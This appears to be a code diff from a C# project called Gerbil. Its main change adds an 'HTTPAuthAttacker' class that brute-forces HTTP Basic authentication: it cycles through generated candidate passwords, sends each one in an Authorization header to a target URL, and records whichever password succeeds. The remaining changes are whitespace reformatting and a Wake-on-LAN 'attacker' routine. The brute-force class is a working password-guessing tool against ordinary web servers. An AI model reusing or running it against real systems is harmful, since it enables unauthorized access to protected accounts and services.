@@ -7,6 +7,7 @@ using System.IO;
 using System.Net.Sockets;
 using System.Globalization;
 using System.Net;
+using Gerbil;
 
 namespace Gerbil
 {
@@ -24,24 +25,24 @@ namespace Gerbil
         };
         public class AttackerNotInitializedException : Exception
         {
-            
+
         }
         public class AttackerNoTargetFoundException : Exception
         {
-            
+
         }
         public class AttackerAttemptsExhaustedException : Exception
         {
-            
+
         }
         public class AttackerAlreadyPenetratedException : Exception
         {
-            
+
         }
         public partial class Attacker
         {
             protected AttackerResult attackerStatus;
-            
+
             /// <summary>
             /// Constructor for Attacker class
             /// </summary>
@@ -68,13 +69,104 @@ namespace Gerbil
             /// </summary>
             public virtual void clean()
             {
-                if(attackerStatus == AttackerResult.Created)
+                if (attackerStatus == AttackerResult.Created)
                 {
                     throw new AttackerNotInitializedException();
                 }
-                else if(attackerStatus ==  AttackerResult.FailedConnection)
+                else if (attackerStatus == AttackerResult.FailedConnection)
                 {
                     throw new AttackerNoTargetFoundException();
+                }
+            }
+        }
+        public class HTTPAuthAttacker : Attacker
+        {
+            private string target;
+            private string foundPassword;
+            private PasswordServices.SimplePasswordCracker cracker;
+
+            public HTTPAuthAttacker(string targetURI, int maxCrackLength)
+                : base()
+            {
+                target = targetURI;
+                cracker = new PasswordServices.SimplePasswordCracker(maxCrackLength);
+            }
+            public override AttackerResult stab()
+            {
+                bool authSuccessful = false;
+                string password;
+                try
+                {
+                    password = cracker.getNextKey();
+                }
+                catch (PasswordServices.PasswordTableExhaustedException e)
+                {
+                    return AttackerResult.FailedAuth;
+                }
+                authSuccessful = httpLogin("http://" + target, "", password);
+                if (authSuccessful)
+                {
+                    foundPassword = password;
+                    return AttackerResult.Connected;
+                }
+                else
+                {
+                    return AttackerResult.Trying;
+                }
+            }
+            public string getAccessString()
+            {
+                return foundPassword;
+            }
+            private bool httpLogin(string url, string username, string password)
+            {
+                HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
+
+                request.Method = "GET";
+                request.UseDefaultCredentials = false;
+                request.PreAuthenticate = true;
+                request.UserAgent = "netscape11";
+                request.Credentials = new NetworkCredential(username, password);
+                request.Headers.Add("Authorization", "Basic " + Convert.ToBase64String(new ASCIIEncoding().GetBytes(username + ":" + password)));
+                // create request
+                HttpWebResponse response;
+                try
+                {
+                    // get response
+                    response = (HttpWebResponse)request.GetResponse();
+                }
+                catch (WebException ex)
+                {
+                    if (((HttpWebResponse)ex.Response).StatusCode == HttpStatusCode.Unauthorized)
+                    {
+                        return false;
+                    }
+                    else
+                    {
+                        // TODO: Add new specific exception here
+                        throw new Exception();
+                    }
+                }
+                bool isForbidden = false;
+                string rBody = new StreamReader(response.GetResponseStream()).ReadToEnd();
+                //string hBody = response.GetResponseHeader();
+                if (rBody.Contains("401"))
+                {
+                    isForbidden = true;
+                }
+                //if (hBody.Contains("401"))
+                //{
+                //    isForbidden = false;
+                //}
+
+                // verify response
+                if (response.StatusCode == HttpStatusCode.OK && !isForbidden)
+                {
+                    return true;
+                }
+                else
+                {
+                    return false;
                 }
             }
         }
@@ -91,9 +183,9 @@ namespace Gerbil
             {
                 //Send network adapter MAC address over UDP 16 times
                 // Prep input parameters
-                if(MACaddress.Contains(':'))
+                if (MACaddress.Contains(':'))
                 {
-                    MACaddress = MACaddress.Replace(":","");
+                    MACaddress = MACaddress.Replace(":", "");
                 }
                 ///////////////////////////////////////////////////////////////////////
                 // Segments of code were copied from:                                //
@@ -128,16 +220,17 @@ namespace Gerbil
                 return attackerStatus;
             }
             //we derive our class from a standard one
-            private class WOLClass : UdpClient    
+            private class WOLClass : UdpClient
             {
-                public WOLClass():base()
+                public WOLClass()
+                    : base()
                 { }
                 //this is needed to send broadcast packet
-                public void SetClientToBrodcastMode()    
+                public void SetClientToBrodcastMode()
                 {
-                    if(this.Active)
+                    if (this.Active)
                         this.Client.SetSocketOption(SocketOptionLevel.Socket,
-                            SocketOptionName.Broadcast,0);
+                            SocketOptionName.Broadcast, 0);
                 }
             }
             //now use this class
